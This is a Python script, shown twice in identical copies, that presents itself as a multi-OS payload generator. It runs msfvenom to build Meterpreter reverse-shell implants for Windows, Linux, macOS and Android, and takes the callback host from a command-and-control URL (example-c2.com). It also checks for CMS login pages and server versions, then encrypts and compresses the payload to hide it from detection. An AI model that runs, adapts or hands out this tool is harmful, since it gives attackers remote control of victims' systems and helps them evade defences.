import os
import platform
import subprocess
import requests
import re
import random
import base64
import json
import gzip
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from io import BytesIO

# Detect system architecture and OS
def detect_system():
    return {
        "os": platform.system(),
        "arch": platform.architecture()[0],
        "release": platform.release(),
        "version": platform.version(),
    }

# CMS detection
def detect_cms():
    cms_vulnerabilities = []
    urls = {
        "WordPress": "/wp-login.php",
        "Joomla": "/administrator/index.php",
        "Drupal": "/user/login",
    }

    for cms, path in urls.items():
        try:
            response = requests.get(f"http://localhost{path}", timeout=5)
            if response.status_code == 200:
                cms_vulnerabilities.append(f"{cms} installation detected. Check for outdated components.")
        except requests.exceptions.RequestException:
            pass
    return cms_vulnerabilities

# Obfuscation with AES encryption and gzip compression
def obfuscate_payload(payload_path):
    print("\nObfuscating payload...")
    try:
        with open(payload_path, "rb") as file:
            data = file.read()

        # AES Encryption
        key = os.urandom(16)
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()

        # Gzip Compression
        buffer = BytesIO()
        with gzip.GzipFile(fileobj=buffer, mode="wb") as gzip_file:
            gzip_file.write(encrypted_data)

        obfuscated_path = payload_path.replace(".", "_obfuscated.")
        with open(obfuscated_path, "wb") as file:
            file.write(buffer.getvalue())

        print(f"Obfuscated payload saved as {obfuscated_path}")
        return obfuscated_path
    except Exception as e:
        print(f"Error during obfuscation: {e}")
        return None

# Generate payload
def generate_payload(os_type, arch, lhost, lport):
    payload_name = f"payload_{os_type.lower()}_{arch}.bin"
    payload_map = {
        "Windows": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {payload_name}",
        "Linux": f"msfvenom -p linux/{arch}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {payload_name}",
        "Darwin": f"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho > {payload_name}",
        "Android": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {payload_name}.apk",
    }

    command = payload_map.get(os_type)
    if not command:
        print(f"Unsupported OS: {os_type}")
        return None

    print(f"Generating payload for {os_type} ({arch})...")
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Payload saved as {payload_name}")
        return payload_name
    except subprocess.CalledProcessError as e:
        print(f"Error generating payload: {e}")
        return None

# Vulnerability detection
def detect_vulnerabilities():
    vulnerabilities = detect_cms()

    # OpenSSL
    try:
        openssl_version = subprocess.check_output("openssl version", shell=True).decode().strip()
        vulnerabilities.append(f"OpenSSL version detected: {openssl_version}")
    except Exception:
        pass

    # Apache or Nginx
    for command, name in [("apache2ctl -v", "Apache"), ("nginx -v", "Nginx")]:
        try:
            version = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode().strip()
            vulnerabilities.append(f"{name} detected: {version}")
        except Exception:
            pass

    return vulnerabilities

# Retrieve commands/configurations from a C2 server
def fetch_c2_config(c2_url):
    try:
        response = requests.get(c2_url, timeout=10)
        if response.status_code == 200:
            print("Retrieved C2 configuration:")
            return json.loads(response.text)
    except Exception as e:
        print(f"Failed to fetch C2 configuration: {e}")
    return {}

# Main function
def main():
    print("=== Multi-OS Payload Generator with Advanced Features ===")
    system_info = detect_system()
    print(f"System: {system_info['os']} ({system_info['arch']}) - Release: {system_info['release']}")

    lhost = fetch_c2_config("http://example-c2.com/config").get("lhost", "127.0.0.1")
    print(f"LHOST: {lhost}")
    lport = input("Enter LPORT (default: 4444): ") or "4444"

    print("\nScanning for vulnerabilities...")
    vulnerabilities = detect_vulnerabilities()
    for vuln in vulnerabilities:
        print(f"  - {vuln}")

    print("\nChoose the target OS:")
    choices = {"1": "Windows", "2": "Linux", "3": "Darwin", "4": "Android"}
    target_os = choices.get(input("1. Windows\n2. Linux\n3. macOS\n4. Android\n> ") or "1", "Windows")

    payload = generate_payload(target_os, system_info["arch"], lhost, lport)
    if payload:
        obfuscated_file = obfuscate_payload(payload)
        print(f"Final obfuscated payload: {obfuscated_file}")

if __name__ == "__main__":
    main()
import os
import platform
import subprocess
import requests
import re
import random
import base64
import json
import gzip
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from io import BytesIO

# Detect system architecture and OS
def detect_system():
    return {
        "os": platform.system(),
        "arch": platform.architecture()[0],
        "release": platform.release(),
        "version": platform.version(),
    }

# CMS detection
def detect_cms():
    cms_vulnerabilities = []
    urls = {
        "WordPress": "/wp-login.php",
        "Joomla": "/administrator/index.php",
        "Drupal": "/user/login",
    }

    for cms, path in urls.items():
        try:
            response = requests.get(f"http://localhost{path}", timeout=5)
            if response.status_code == 200:
                cms_vulnerabilities.append(f"{cms} installation detected. Check for outdated components.")
        except requests.exceptions.RequestException:
            pass
    return cms_vulnerabilities

# Obfuscation with AES encryption and gzip compression
def obfuscate_payload(payload_path):
    print("\nObfuscating payload...")
    try:
        with open(payload_path, "rb") as file:
            data = file.read()

        # AES Encryption
        key = os.urandom(16)
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()

        # Gzip Compression
        buffer = BytesIO()
        with gzip.GzipFile(fileobj=buffer, mode="wb") as gzip_file:
            gzip_file.write(encrypted_data)

        obfuscated_path = payload_path.replace(".", "_obfuscated.")
        with open(obfuscated_path, "wb") as file:
            file.write(buffer.getvalue())

        print(f"Obfuscated payload saved as {obfuscated_path}")
        return obfuscated_path
    except Exception as e:
        print(f"Error during obfuscation: {e}")
        return None

# Generate payload
def generate_payload(os_type, arch, lhost, lport):
    payload_name = f"payload_{os_type.lower()}_{arch}.bin"
    payload_map = {
        "Windows": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {payload_name}",
        "Linux": f"msfvenom -p linux/{arch}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {payload_name}",
        "Darwin": f"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho > {payload_name}",
        "Android": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {payload_name}.apk",
    }

    command = payload_map.get(os_type)
    if not command:
        print(f"Unsupported OS: {os_type}")
        return None

    print(f"Generating payload for {os_type} ({arch})...")
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Payload saved as {payload_name}")
        return payload_name
    except subprocess.CalledProcessError as e:
        print(f"Error generating payload: {e}")
        return None

# Vulnerability detection
def detect_vulnerabilities():
    vulnerabilities = detect_cms()

    # OpenSSL
    try:
        openssl_version = subprocess.check_output("openssl version", shell=True).decode().strip()
        vulnerabilities.append(f"OpenSSL version detected: {openssl_version}")
    except Exception:
        pass

    # Apache or Nginx
    for command, name in [("apache2ctl -v", "Apache"), ("nginx -v", "Nginx")]:
        try:
            version = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode().strip()
            vulnerabilities.append(f"{name} detected: {version}")
        except Exception:
            pass

    return vulnerabilities

# Retrieve commands/configurations from a C2 server
def fetch_c2_config(c2_url):
    try:
        response = requests.get(c2_url, timeout=10)
        if response.status_code == 200:
            print("Retrieved C2 configuration:")
            return json.loads(response.text)
    except Exception as e:
        print(f"Failed to fetch C2 configuration: {e}")
    return {}

# Main function
def main():
    print("=== Multi-OS Payload Generator with Advanced Features ===")
    system_info = detect_system()
    print(f"System: {system_info['os']} ({system_info['arch']}) - Release: {system_info['release']}")

    lhost = fetch_c2_config("http://example-c2.com/config").get("lhost", "127.0.0.1")
    print(f"LHOST: {lhost}")
    lport = input("Enter LPORT (default: 4444): ") or "4444"

    print("\nScanning for vulnerabilities...")
    vulnerabilities = detect_vulnerabilities()
    for vuln in vulnerabilities:
        print(f"  - {vuln}")

    print("\nChoose the target OS:")
    choices = {"1": "Windows", "2": "Linux", "3": "Darwin", "4": "Android"}
    target_os = choices.get(input("1. Windows\n2. Linux\n3. macOS\n4. Android\n> ") or "1", "Windows")

    payload = generate_payload(target_os, system_info["arch"], lhost, lport)
    if payload:
        obfuscated_file = obfuscate_payload(payload)
        print(f"Final obfuscated payload: {obfuscated_file}")

if __name__ == "__main__":
    main()
